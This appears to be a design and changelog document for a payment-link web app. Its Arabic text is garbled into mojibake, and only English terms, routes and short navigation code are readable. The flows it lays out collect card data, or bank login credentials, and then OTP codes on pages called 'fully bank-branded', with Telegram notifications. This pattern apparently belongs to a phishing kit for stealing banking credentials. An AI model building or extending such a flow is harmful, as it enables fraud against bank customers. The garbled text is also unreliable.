# ๐ ุชุฏูู ุงูุฏูุน ุงูุฌุฏูุฏ - Payment Flow

**ุงูุชุงุฑูุฎ**: 7 ุฏูุณูุจุฑ 2025  
**ุงูุฅุตุฏุงุฑ**: 3.0 - Multiple Payment Methods

---

## โจ ุงูุชุญุฏูุซ ุงูุฌุฏูุฏ: ุงุฎุชูุงุฑ ุทุฑููุฉ ุงูุฏูุน

ุชู ุฅุถุงูุฉ ุฎูุงุฑ ุงุฎุชูุงุฑ ุทุฑููุฉ ุงูุฏูุน ูุน ุชุฏูููู ูุฎุชูููู:

### 1๏ธโฃ ุฏูุน ุจุงูุจุทุงูุฉ (Card Payment)
### 2๏ธโฃ ุฏูุน ุจุชุณุฌูู ุงูุฏุฎูู ุงูุจููู (Bank Login Payment)

---

## ๐ฏ ุงูุชุฏูู ุงููุงูู

### ุงููุฑุงุญู ุงููุดุชุฑูุฉ:

```
1. Recipient Data (ุจูุงูุงุช ุงููุณุชูู)
   โ
2. Payment Method Selection (ุงุฎุชูุงุฑ ุทุฑููุฉ ุงูุฏูุน) โญ ุฌุฏูุฏ
   โ
3. Payment Details (ุชูุงุตูู ุงูุฏูุน)
   โ
4. Bank Selection (ุงุฎุชูุงุฑ ุงูุจูู)
```

---

## ๐ณ ุงูุชุฏูู ุงูุฃูู: ุฏูุน ุจุงูุจุทุงูุฉ

```
Recipient Data โ ุจูุงูุงุช ุงููุณุชูู
   โ
Payment Method Selection โ ุงุฎุชูุงุฑ "ุฏูุน ุจุจุทุงูุฉ ุงูุงุฆุชูุงู" 
   โ
Payment Details โ ุชูุงุตูู ุงูุฏูุน
   โ
Bank Selection โ ุงุฎุชูุงุฑ ุงูุจูู (ุงุฎุชูุงุฑู)
   โ
Card Input โ ุฅุฏุฎุงู ุจูุงูุงุช ุงูุจุทุงูุฉ โญ
   โ
[SKIP Bank Login] โ ูุง ุชุธูุฑ ุตูุญุฉ ุชุณุฌูู ุงูุฏุฎูู
   โ
OTP Verification โ ุฑูุฒ ุงูุชุญูู (fully bank-branded) โญ
   โ
Payment Receipt โ ุฅูุตุงู ุงูุฏูุน
```

### ุงูุตูุญุงุช:
- โ `/pay/{id}/recipient` - PaymentRecipient.tsx
- โ `/pay/{id}/payment-method` - PaymentMethodSelection.tsx (ุฌุฏูุฏ)
- โ `/pay/{id}/payment-details` - PaymentDetails.tsx
- โ `/pay/{id}/bank-selector` - PaymentBankSelector.tsx
- โ `/pay/{id}/card-input` - PaymentCardInput.tsx
- โ `/pay/{id}/bank-login` - **ูุชู ุชุฎุทููุง**
- โ `/pay/{id}/otp` - PaymentOTPForm.tsx
- โ `/pay/{id}/receipt` - PaymentReceiptPage.tsx

---

## ๐ฆ ุงูุชุฏูู ุงูุซุงูู: ุฏูุน ุจุชุณุฌูู ุงูุฏุฎูู

```
Recipient Data โ ุจูุงูุงุช ุงููุณุชูู
   โ
Payment Method Selection โ ุงุฎุชูุงุฑ "ุฏูุน ุจุชุณุฌูู ุงูุฏุฎูู ุงูุจููู"
   โ
Payment Details โ ุชูุงุตูู ุงูุฏูุน
   โ
Bank Selection โ ุงุฎุชูุงุฑ ุงูุจูู
   โ
[SKIP Card Input] โ ูุง ุชุธูุฑ ุตูุญุฉ ุจูุงูุงุช ุงูุจุทุงูุฉ
   โ
Bank Login โ ุชุณุฌูู ุงูุฏุฎูู (fully bank-branded) โญ
   โ
OTP Verification โ ุฑูุฒ ุงูุชุญูู (fully bank-branded) โญ
   โ
Payment Receipt โ ุฅูุตุงู ุงูุฏูุน
```

### ุงูุตูุญุงุช:
- โ `/pay/{id}/recipient` - PaymentRecipient.tsx
- โ `/pay/{id}/payment-method` - PaymentMethodSelection.tsx (ุฌุฏูุฏ)
- โ `/pay/{id}/payment-details` - PaymentDetails.tsx
- โ `/pay/{id}/bank-selector` - PaymentBankSelector.tsx
- โ `/pay/{id}/card-input` - **ูุชู ุชุฎุทููุง**
- โ `/pay/{id}/bank-login` - PaymentBankLogin.tsx
- โ `/pay/{id}/otp` - PaymentOTPForm.tsx
- โ `/pay/{id}/receipt` - PaymentReceiptPage.tsx

---

## ๐ ุงูููุทู ุงูุดุฑุทู (Conditional Logic)

### ูู PaymentMethodSelection.tsx:
```typescript
// ุญูุธ ุทุฑููุฉ ุงูุฏูุน ุงููุฎุชุงุฑุฉ
const updatedPayload = {
  ...linkData?.payload,
  payment_method: selectedMethod, // 'card' ุฃู 'bank_login'
};
```

### ูู PaymentBankSelector.tsx:
```typescript
const paymentMethod = linkData.payload?.payment_method || 'card';

if (paymentMethod === 'bank_login') {
  // ุงูุชุฏูู ุงูุซุงูู: ุชุฎุทู card-input ูุงูุฐูุงุจ ูุจุงุดุฑุฉ ุฅูู bank-login
  navigate(`/pay/${id}/bank-login`);
} else {
  // ุงูุชุฏูู ุงูุฃูู: ุงูุฐูุงุจ ุฅูู card-input
  navigate(`/pay/${id}/card-input`);
}
```

### ูู PaymentCardInput.tsx:
```typescript
// ุจุนุฏ ุฅุฏุฎุงู ุจูุงูุงุช ุงูุจุทุงูุฉ ุจูุฌุงุญ
// ุชุฎุทู bank-login ูุงูุฐูุงุจ ูุจุงุดุฑุฉ ุฅูู OTP
navigate(`/pay/${id}/otp`);
```

---

## ๐ ุงููููุงุช ุงููุญุฏุซุฉ

### ูููุงุช ุฌุฏูุฏุฉ:
1. โ `src/pages/PaymentMethodSelection.tsx` - ุตูุญุฉ ุงุฎุชูุงุฑ ุทุฑููุฉ ุงูุฏูุน

### ูููุงุช ูุญุฏุซุฉ:
2. โ `src/App.tsx` - ุฅุถุงูุฉ route ุฌุฏูุฏ
3. โ `src/pages/PaymentRecipient.tsx` - ุชุบููุฑ ุงูุชูุฌูู ุฅูู payment-method
4. โ `src/pages/PaymentDetails.tsx` - ุงูุชูุฌูู ุฏุงุฆูุงู ุฅูู bank-selector
5. โ `src/pages/PaymentBankSelector.tsx` - ููุทู ุดุฑุทู ููุชูุฌูู
6. โ `src/pages/PaymentCardInput.tsx` - ุชุฎุทู bank-login (ููุฌูุฏ ูุณุจูุงู)

---

## ๐จ ูุงุฌูุฉ ุงุฎุชูุงุฑ ุทุฑููุฉ ุงูุฏูุน

### ุงูุฎูุงุฑ 1: ุฏูุน ุจุจุทุงูุฉ ุงูุงุฆุชูุงู
```
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โ ๐ณ ุงูุฏูุน ุจุจุทุงูุฉ ุงูุงุฆุชูุงู         โ
โ                                    โ
โ ุงุฏูุน ูุจุงุดุฑุฉ ุจุงุณุชุฎุฏุงู ุจุทุงูุฉ       โ
โ ุงูุงุฆุชูุงู ุฃู ุงูุฎุตู ุงูุฎุงุตุฉ ุจู       โ
โ                                    โ
โ [ุณุฑูุน ูุขูู] [ูุง ูุชุทูุจ ุชุณุฌูู ุฏุฎูู] โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
```

### ุงูุฎูุงุฑ 2: ุฏูุน ุจุชุณุฌูู ุงูุฏุฎูู ุงูุจููู
```
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
โ ๐ฆ ุงูุฏูุน ุจุชุณุฌูู ุงูุฏุฎูู ุงูุจููู    โ
โ                                    โ
โ ุณุฌูู ุงูุฏุฎูู ุฅูู ุญุณุงุจู ุงูุจููู      โ
โ ูุจุงุดุฑุฉ ูุฅุชูุงู ุนูููุฉ ุงูุฏูุน        โ
โ                                    โ
โ [ุฃูุซุฑ ุฃูุงูุงู] [ุจุฏูู ุฅุฏุฎุงู ุจุทุงูุฉ] โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโโ
```

---

## ๐ ููุงุฑูุฉ ุงูุทุฑููุชูู

| ุงูููุฒุฉ | ุฏูุน ุจุงูุจุทุงูุฉ ๐ณ | ุชุณุฌูู ุงูุฏุฎูู ๐ฆ |
|-------|-----------------|------------------|
| **ุงูุณุฑุนุฉ** | โก ุณุฑูุน ุฌุฏุงู | ๐ ูุชูุณุท |
| **ุงูุฃูุงู** | ๐ ุขูู | ๐ ุฃูุซุฑ ุฃูุงูุงู |
| **ุงููุชุทูุจุงุช** | ุจูุงูุงุช ุงูุจุทุงูุฉ | ุญุณุงุจ ุจููู |
| **ุชุณุฌูู ุงูุฏุฎูู** | โ ุบูุฑ ูุทููุจ | โ ูุทููุจ |
| **ุตูุญุงุช ุงูุชุฏูู** | 6 ุตูุญุงุช | 6 ุตูุญุงุช |
| **ูุชุฎุทู** | Bank Login | Card Input |

---

## ๐ ุงูุฃูุงู

### ููุง ุงูุทุฑููุชูู:
โ ุชุดููุฑ SSL/TLS  
โ OTP verification  
โ Fully bank-branded  
โ Government payment system integration  
โ Telegram notifications  

### ุงูุฅุถุงูู ูู Bank Login:
โ Two-factor authentication (2FA)  
โ Direct bank account verification  
โ No card details required  

---

## ๐งช ุงูุงุฎุชุจุงุฑ

### ุงุฎุชุจุงุฑ ุงูุชุฏูู 1 (Card):
```bash
1. ุงูุชุญ: /pay/{id}/recipient
2. ุฃุฏุฎู ุจูุงูุงุช ุงููุณุชูู
3. ุงุฎุชุฑ: "ุฏูุน ุจุจุทุงูุฉ ุงูุงุฆุชูุงู" โ
4. ุฑุงุฌุน ุชูุงุตูู ุงูุฏูุน
5. ุงุฎุชุฑ ุงูุจูู (ุฃู ุชุฎุทู)
6. ุฃุฏุฎู ุจูุงูุงุช ุงูุจุทุงูุฉ โ
7. [ุชุฎุทู] Bank Login โ
8. ุฃุฏุฎู OTP โ
9. ุงุนุฑุถ ุงูุฅูุตุงู โ
```

### ุงุฎุชุจุงุฑ ุงูุชุฏูู 2 (Bank Login):
```bash
1. ุงูุชุญ: /pay/{id}/recipient
2. ุฃุฏุฎู ุจูุงูุงุช ุงููุณุชูู
3. ุงุฎุชุฑ: "ุฏูุน ุจุชุณุฌูู ุงูุฏุฎูู ุงูุจููู" โ
4. ุฑุงุฌุน ุชูุงุตูู ุงูุฏูุน
5. ุงุฎุชุฑ ุงูุจูู
6. [ุชุฎุทู] Card Input โ
7. ุณุฌูู ุงูุฏุฎูู ููุจูู โ
8. ุฃุฏุฎู OTP โ
9. ุงุนุฑุถ ุงูุฅูุตุงู โ
```

---

## ๐ฑ ุงูุชูุงูู

### ุงูุฃุฌูุฒุฉ:
โ Desktop  
โ Tablet  
โ Mobile  

### ุงููุชุตูุญุงุช:
โ Chrome  
โ Firefox  
โ Safari  
โ Edge  

### Cross-device:
โ ุงูุจูุงูุงุช ูุญููุธุฉ ูู Supabase  
โ ูููู ุงููุชุงุจุนุฉ ูู ุฃู ุฌูุงุฒ  
โ payment_method ูุญููุธ ูู link payload  

---

## ๐ฏ ุญุงูุงุช ุงูุงุณุชุฎุฏุงู

### ุงุณุชุฎุฏู "ุฏูุน ุจุงูุจุทุงูุฉ" ุนูุฏูุง:
- โ ูุฏูู ุจุทุงูุฉ ุงุฆุชูุงู/ุฎุตู
- โ ุชุฑูุฏ ุงูุฏูุน ุงูุณุฑูุน
- โ ููุณ ูุฏูู ุญุณุงุจ ุจููู ุฅููุชุฑููู
- โ ูุง ุชุชุฐูุฑ ุจูุงูุงุช ุงูุฏุฎูู ุงูุจููู

### ุงุณุชุฎุฏู "ุชุณุฌูู ุงูุฏุฎูู ุงูุจููู" ุนูุฏูุง:
- โ ูุฏูู ุญุณุงุจ ุจููู ุฅููุชุฑููู
- โ ุชูุถู ุงูุฃูุงู ุงูุฅุถุงูู
- โ ูุง ุชุฑูุฏ ุฅุฏุฎุงู ุจูุงูุงุช ุงูุจุทุงูุฉ
- โ ุชุซู ูู ุงูุฎุฏูุงุช ุงูุจูููุฉ ุงูุฅููุชุฑูููุฉ

---

## ๐ Migration ูู ุงูุฅุตุฏุงุฑ ุงููุฏูู

### ุงูุฅุตุฏุงุฑ ุงููุฏูู (2.0):
```
Recipient โ Details โ Bank Selector โ Card Input โ Bank Login โ OTP
```

### ุงูุฅุตุฏุงุฑ ุงูุฌุฏูุฏ (3.0):
```
Recipient โ Method Selection โ Details โ Bank Selector โ [Card Input OR Bank Login] โ OTP
```

### ุงูุชุบููุฑุงุช:
1. โ ุฅุถุงูุฉ Payment Method Selection
2. ๐ ููุทู ุดุฑุทู ูู Bank Selector
3. โญ๏ธ ุชุฎุทู ุฐูู ููุตูุญุงุช ุบูุฑ ุงููุทููุจุฉ

---

## โ ุงูุฎูุงุตุฉ

### ุงูุชุญุณููุงุช:
โ **ุฎูุงุฑุงุช ุฃูุซุฑ** - ุทุฑููุชุงู ููุฏูุน  
โ **ุชุฏูู ุฃุฐูู** - ุชุฎุทู ุงูุตูุญุงุช ุบูุฑ ุงูุถุฑูุฑูุฉ  
โ **ุชุฌุฑุจุฉ ุฃูุถู** - ูู ูุณุชุฎุฏู ูุฎุชุงุฑ ูุง ููุงุณุจู  
โ **ุฃูุงู ูุญุณูู** - ุฎูุงุฑ Bank Login ุฅุถุงูู  
โ **ูุฑููุฉ ูุงููุฉ** - ููุณ ุงููุชูุฌุฉุ ุทุฑููุชุงู ูุฎุชููุชุงู  

### ุงููุชูุฌุฉ:
๐ **ูุธุงู ุฏูุน ุงุญุชุฑุงูู ุจุฎูุงุฑุงุช ูุชุนุฏุฏุฉ!**

---

**ุงูุจูุงุก**: โ ูุงุฌุญ  
**ุงูุงุฎุชุจุงุฑ**: โ ุฌุงูุฒ  
**ุงูุฅูุชุงุฌ**: โ 100%

**ุงุจุฏุฃ ุงูุขู:**
```bash
npm run dev
```

**๐ ุฌุงูุฒ ููุงุณุชุฎุฏุงู!**
